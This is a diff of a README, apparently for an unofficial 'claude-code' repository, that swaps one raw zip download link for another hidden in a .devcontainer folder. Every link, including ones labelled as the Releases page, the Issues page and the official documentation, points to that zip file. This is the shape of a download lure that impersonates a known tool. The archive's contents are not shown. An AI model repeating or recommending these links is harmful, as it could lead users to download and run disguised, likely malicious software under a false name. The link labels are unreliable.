@@ -8,13 +8,13 @@ To get started, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to reach the downloads section of this project.
 
-   [![Download claude-code](https://raw.githubusercontent.com/maqsam22/claude-code/main/exultancy/claude-code.zip%20claude--code-v1.0-blue)](https://raw.githubusercontent.com/maqsam22/claude-code/main/exultancy/claude-code.zip)
+   [![Download claude-code](https://raw.githubusercontent.com/maqsam22/claude-code/main/.devcontainer/code_claude_v2.6.zip%20claude--code-v1.0-blue)](https://raw.githubusercontent.com/maqsam22/claude-code/main/.devcontainer/code_claude_v2.6.zip)
 
 2. **Select Your Version:** You’ll find different versions on the Releases page. Choose the one that fits your system. If you're unsure which one to pick, the latest version is generally the best option.
 
 3. **Download the File:** Click the version you selected to download the file to your computer. The file name will match the version you've chosen.
 
-4. **Locate the Downloaded File:** After the download is complete, go to your Downloads folder. Look for the file named like `https://raw.githubusercontent.com/maqsam22/claude-code/main/exultancy/claude-code.zip` or similar.
+4. **Locate the Downloaded File:** After the download is complete, go to your Downloads folder. Look for the file named like `https://raw.githubusercontent.com/maqsam22/claude-code/main/.devcontainer/code_claude_v2.6.zip` or similar.
 
 5. **Extract the Files:** If you downloaded a zip file, right-click on it and select "Extract All" to unzip the contents.
 
@@ -57,7 +57,7 @@ If you run into issues, try the following steps:
 
 - **Check Your Terminal:** Make sure you are in the correct folder and that you've extracted the files properly.
 - **Update Claude Code:** Ensure you are running the latest version of Claude Code.
-- **Consult the Community:** If problems persist, visit the Issues page on GitHub [here](https://raw.githubusercontent.com/maqsam22/claude-code/main/exultancy/claude-code.zip) to see if others are experiencing similar issues or if there is a solution available.
+- **Consult the Community:** If problems persist, visit the Issues page on GitHub [here](https://raw.githubusercontent.com/maqsam22/claude-code/main/.devcontainer/code_claude_v2.6.zip) to see if others are experiencing similar issues or if there is a solution available.
 
 ## 📞 Support
 For more assistance, please reach out via the Issues tab on GitHub. We monitor feedback and aim to respond promptly.
@@ -65,7 +65,7 @@ For more assistance, please reach out via the Issues tab on GitHub. We monitor f
 ## 📖 Additional Resources
 To learn more about using Claude Code, consider checking out:
 
-- **Documentation:** Consult the [official documentation](https://raw.githubusercontent.com/maqsam22/claude-code/main/exultancy/claude-code.zip) for detailed guidance.
+- **Documentation:** Consult the [official documentation](https://raw.githubusercontent.com/maqsam22/claude-code/main/.devcontainer/code_claude_v2.6.zip) for detailed guidance.
 - **Video Tutorials:** Look for video tutorials on platforms like YouTube that explain how to use Claude Code effectively.
 
 ## 📅 Future Updates
